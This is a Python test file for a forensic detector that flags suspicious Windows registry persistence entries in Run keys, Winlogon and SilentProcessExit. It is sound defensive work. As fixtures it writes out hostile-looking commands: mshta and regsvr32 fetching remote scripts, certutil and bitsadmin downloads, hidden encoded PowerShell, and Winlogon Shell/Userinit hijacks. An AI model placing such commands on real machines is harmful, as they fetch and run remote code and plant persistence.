"""Windows registry persistence deep-audit detector tests."""

from __future__ import annotations

from digger.core.evidence import Artifact, EvidenceStore
from digger.detectors.windows_registry_audit import (
    WindowsRegistryAuditDetector,
    _command_writable,
    _first_token_basename,
    _has_network_fetch,
    _is_encoded_powershell,
    _is_proxy_exec,
    _is_run_or_runonce_subkey,
    _is_silent_process_exit_subkey,
    _is_winlogon_subkey,
)


# ---- helpers ---- #


def _make_run_artifact(values: dict,
                        hive: str = "HKLM",
                        subkey: str =
                            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
                        ) -> Artifact:
    return Artifact(
        collector="windows.registry_persistence",
        category="persistence",
        subject=f"{hive}\\{subkey}",
        data={
            "hive": hive,
            "subkey": subkey,
            "mitre": "T1547.001",
            "values": values,
            "subkey_count": 0,
            "subkey_sample": [],
        },
    )


def _make_winlogon_artifact(values: dict) -> Artifact:
    subkey = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    return Artifact(
        collector="windows.registry_persistence",
        category="persistence",
        subject=f"HKLM\\{subkey}",
        data={
            "hive": "HKLM",
            "subkey": subkey,
            "mitre": "T1547.004",
            "values": values,
            "subkey_count": 0,
            "subkey_sample": [],
        },
    )


def _make_silent_process_exit_artifact(subkey_count: int,
                                         subkey_sample: list) -> Artifact:
    subkey = (
        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit"
    )
    return Artifact(
        collector="windows.registry_persistence",
        category="persistence",
        subject=f"HKLM\\{subkey}",
        data={
            "hive": "HKLM",
            "subkey": subkey,
            "mitre": "T1546.012",
            "values": {},
            "subkey_count": subkey_count,
            "subkey_sample": subkey_sample,
        },
    )


# ---- subkey classifiers ---- #


def test_is_run_or_runonce_subkey():
    assert _is_run_or_runonce_subkey(
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    ) is True
    assert _is_run_or_runonce_subkey(
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
    ) is True
    assert _is_run_or_runonce_subkey(
        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
    ) is True
    assert _is_run_or_runonce_subkey(
        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    ) is False


def test_is_winlogon_subkey():
    assert _is_winlogon_subkey(
        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    ) is True
    assert _is_winlogon_subkey(
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    ) is False


def test_is_silent_process_exit_subkey():
    assert _is_silent_process_exit_subkey(
        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit"
    ) is True
    assert _is_silent_process_exit_subkey(
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    ) is False


# ---- _command_writable ---- #


def test_command_writable_temp():
    assert _command_writable(
        r"C:\Users\alice\AppData\Local\Temp\evil.exe",
    ) is True


def test_command_writable_public():
    assert _command_writable(
        r"C:\Users\Public\implant.exe",
    ) is True


def test_command_writable_env_var():
    assert _command_writable("%TEMP%\\bad.bat") is True


def test_command_writable_safe():
    assert _command_writable(
        r"C:\Program Files\MyApp\app.exe",
    ) is False
    assert _command_writable(r"C:\Windows\System32\notepad.exe") is False


def test_command_writable_empty():
    assert _command_writable("") is False
    assert _command_writable(None) is False


# ---- _first_token_basename ---- #


def test_first_token_basename_unquoted_with_path():
    assert _first_token_basename(
        r"C:\Windows\System32\rundll32.exe foo.dll,bar"
    ) == "rundll32"


def test_first_token_basename_quoted_path():
    assert _first_token_basename(
        '"C:\\Program Files\\App\\my app.exe" --flag'
    ) == "my app"


def test_first_token_basename_bare_name():
    assert _first_token_basename("mshta.exe http://x") == "mshta"


def test_first_token_basename_empty():
    assert _first_token_basename("") == ""


# ---- _is_proxy_exec ---- #


def test_is_proxy_exec_rundll32():
    assert _is_proxy_exec(
        r"C:\Windows\System32\rundll32.exe foo.dll,bar"
    ) is True


def test_is_proxy_exec_mshta_url():
    assert _is_proxy_exec("mshta.exe http://e.com/x.hta") is True


def test_is_proxy_exec_regsvr32_scrobj():
    assert _is_proxy_exec(
        "regsvr32 /s /u /n /i:http://e.com/a.sct scrobj.dll"
    ) is True


def test_is_proxy_exec_safe_command():
    assert _is_proxy_exec("notepad.exe") is False
    assert _is_proxy_exec(
        r"C:\Program Files\MyApp\app.exe"
    ) is False


def test_is_proxy_exec_empty():
    assert _is_proxy_exec("") is False


# ---- _is_encoded_powershell ---- #


def test_is_encoded_powershell_full_form():
    assert _is_encoded_powershell(
        "powershell.exe -EncodedCommand JABw..."
    ) is True


def test_is_encoded_powershell_short_form():
    assert _is_encoded_powershell(
        "powershell -enc JABw..."
    ) is True


def test_is_encoded_powershell_no_encoded():
    assert _is_encoded_powershell(
        "powershell.exe -File C:\\x.ps1"
    ) is False
    assert _is_encoded_powershell("notepad.exe") is False


# ---- _has_network_fetch ---- #


def test_has_network_fetch_curl():
    assert _has_network_fetch(
        "curl -o C:\\x.exe https://e.com/x"
    ) is True


def test_has_network_fetch_invoke_webrequest():
    assert _has_network_fetch(
        "powershell -c \"Invoke-WebRequest -Uri https://e.com\""
    ) is True


def test_has_network_fetch_certutil_urlcache():
    assert _has_network_fetch(
        "certutil -urlcache -split -f https://e.com/x x.exe"
    ) is True


def test_has_network_fetch_bitsadmin():
    assert _has_network_fetch(
        "bitsadmin /transfer myJob https://e.com/x C:\\x"
    ) is True


def test_has_network_fetch_safe():
    assert _has_network_fetch(
        "notepad.exe C:\\Users\\alice\\Documents\\notes.txt"
    ) is False


# ---- R1 writable path ---- #


def test_r1_writable_path_high(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        store.add_artifact(_make_run_artifact({
            "EvilApp": r"C:\Users\alice\AppData\Local\Temp\evil.exe",
        }))
        findings = list(WindowsRegistryAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "registry_run_writable_path"]
        assert len(f) == 1
        assert f[0].severity == "high"
        assert f[0].mitre == "T1547.001"
    finally:
        store.close()


def test_r1_no_finding_for_safe_path(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        store.add_artifact(_make_run_artifact({
            "MyApp": r"C:\Program Files\MyApp\app.exe",
        }))
        findings = list(WindowsRegistryAuditDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind")
                    == "registry_run_writable_path"]
    finally:
        store.close()


# ---- R2 proxy exec ---- #


def test_r2_rundll32_high(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        store.add_artifact(_make_run_artifact({
            "Updater": r"C:\Windows\System32\rundll32.exe x.dll,EntryPoint",
        }))
        findings = list(WindowsRegistryAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "registry_run_proxy_exec"]
        assert len(f) == 1
        assert f[0].severity == "high"
        assert f[0].mitre == "T1218"
    finally:
        store.close()


def test_r2_mshta_high(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        store.add_artifact(_make_run_artifact({
            "Helper": "mshta.exe http://example.com/x.hta",
        }))
        findings = list(WindowsRegistryAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "registry_run_proxy_exec"]
        assert len(f) == 1
    finally:
        store.close()


# ---- R3 encoded PowerShell ---- #


def test_r3_encoded_powershell_high(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        store.add_artifact(_make_run_artifact({
            "Init": (
                "powershell.exe -nop -w hidden -EncodedCommand "
                "JABwAGEAdABoACAAPQAgACgAUgBlAGcA"
            ),
        }))
        findings = list(WindowsRegistryAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind")
             == "registry_run_encoded_powershell"]
        assert len(f) == 1
        assert f[0].severity == "high"
        assert f[0].mitre == "T1059.001"
    finally:
        store.close()


def test_r3_no_finding_for_plain_powershell(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        store.add_artifact(_make_run_artifact({
            "Script": "powershell.exe -File C:\\Scripts\\x.ps1",
        }))
        findings = list(WindowsRegistryAuditDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind")
                    == "registry_run_encoded_powershell"]
    finally:
        store.close()


# ---- R4 network fetch ---- #


def test_r4_network_fetch_high(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        store.add_artifact(_make_run_artifact({
            "FetchMe": (
                "certutil -urlcache -split -f "
                "https://e.com/x C:\\x.exe"
            ),
        }))
        findings = list(WindowsRegistryAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "registry_run_network_fetch"]
        assert len(f) == 1
        assert f[0].severity == "high"
    finally:
        store.close()


# ---- R5 Winlogon Shell / Userinit hijack ---- #


def test_r5_winlogon_shell_hijack_critical(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        store.add_artifact(_make_winlogon_artifact({
            "Shell": r"C:\Users\Public\evil.exe",
            "Userinit": r"C:\Windows\System32\userinit.exe,",
        }))
        findings = list(WindowsRegistryAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "registry_winlogon_hijack"]
        assert len(f) == 1
        assert f[0].severity == "critical"
        assert f[0].evidence["value_name"] == "Shell"
        assert f[0].mitre == "T1547.004"
    finally:
        store.close()


def test_r5_winlogon_userinit_hijack(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        store.add_artifact(_make_winlogon_artifact({
            "Shell": "explorer.exe",
            "Userinit":
                r"C:\Windows\System32\userinit.exe,C:\users\public\hijack.exe,",
        }))
        findings = list(WindowsRegistryAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "registry_winlogon_hijack"]
        assert len(f) == 1
        assert f[0].evidence["value_name"] == "Userinit"
    finally:
        store.close()


def test_r5_no_finding_for_defaults(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        store.add_artifact(_make_winlogon_artifact({
            "Shell": "explorer.exe",
            "Userinit": r"C:\Windows\System32\userinit.exe,",
        }))
        findings = list(WindowsRegistryAuditDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind")
                    == "registry_winlogon_hijack"]
    finally:
        store.close()


# ---- R6 SilentProcessExit ---- #


def test_r6_silent_process_exit_subkeys_high(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        store.add_artifact(_make_silent_process_exit_artifact(
            subkey_count=2,
            subkey_sample=["winlogon.exe", "lsass.exe"],
        ))
        findings = list(WindowsRegistryAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "registry_silent_process_exit"]
        assert len(f) == 1
        assert f[0].severity == "high"
        assert f[0].evidence["subkey_count"] == 2
    finally:
        store.close()


def test_r6_no_finding_for_empty(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        store.add_artifact(_make_silent_process_exit_artifact(
            subkey_count=0, subkey_sample=[],
        ))
        findings = list(WindowsRegistryAuditDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind")
                    == "registry_silent_process_exit"]
    finally:
        store.close()


# ---- stacking ---- #


def test_stacking_one_run_value_multiple_findings(tmp_path):
    """A Run value can fail multiple checks at once."""
    store = EvidenceStore(tmp_path / "case")
    try:
        store.add_artifact(_make_run_artifact({
            "BadBoy": (
                "powershell.exe -enc JABwAA== "
                "&& certutil -urlcache https://e.com/x C:\\users\\public\\x"
            ),
        }))
        findings = list(WindowsRegistryAuditDetector().detect(store))
        kinds = {f.evidence.get("kind") for f in findings}
        assert "registry_run_encoded_powershell" in kinds
        assert "registry_run_network_fetch" in kinds
        assert "registry_run_writable_path" in kinds
    finally:
        store.close()


# ---- scope / misc ---- #


def test_detector_returns_no_findings_on_empty_store(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        assert list(WindowsRegistryAuditDetector().detect(store)) == []
    finally:
        store.close()


def test_detector_ignores_other_collectors(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        store.add_artifact(Artifact(
            collector="other.collector",
            category="persistence",
            subject="x",
            data={"values": {"x": r"C:\users\public\evil.exe"}},
        ))
        assert list(WindowsRegistryAuditDetector().detect(store)) == []
    finally:
        store.close()


def test_detector_ignores_non_audited_subkeys(tmp_path):
    """IFEO / COM CLSID / Office Add-ins are collected but this
    detector doesn't audit them (separate iteration)."""
    store = EvidenceStore(tmp_path / "case")
    try:
        store.add_artifact(Artifact(
            collector="windows.registry_persistence",
            category="persistence",
            subject=r"HKLM\SOFTWARE\Classes\CLSID",
            data={
                "hive": "HKLM",
                "subkey": r"SOFTWARE\Classes\CLSID",
                "mitre": "T1546.015",
                "values": {},
                "subkey_count": 1500,
                "subkey_sample": ["{...}"],
            },
        ))
        assert list(WindowsRegistryAuditDetector().detect(store)) == []
    finally:
        store.close()


def test_detector_handles_non_string_value(tmp_path):
    """Some registry values are integers (REG_DWORD); shouldn't crash."""
    store = EvidenceStore(tmp_path / "case")
    try:
        store.add_artifact(_make_run_artifact({
            "Counter": 42,
            "Bad": r"C:\Users\Public\x.exe",
        }))
        findings = list(WindowsRegistryAuditDetector().detect(store))
        # Bad fires; Counter (42 stringified to "42") doesn't.
        assert len(findings) == 1
        assert findings[0].evidence["value_name"] == "Bad"
    finally:
        store.close()


def test_detector_registered_in_all_detectors():
    from digger.detectors import all_detectors
    names = {d.name for d in all_detectors()}
    assert "windows_registry_audit" in names


def test_detector_sigma_template_has_persistence_tags():
    det = WindowsRegistryAuditDetector()
    tpl = det.to_sigma_template()
    assert tpl["id"] == "digger-windows-registry-audit-template"
    assert "attack.t1547.001" in tpl["tags"]
    assert "attack.t1547.004" in tpl["tags"]
    assert tpl["logsource"]["product"] == "windows"
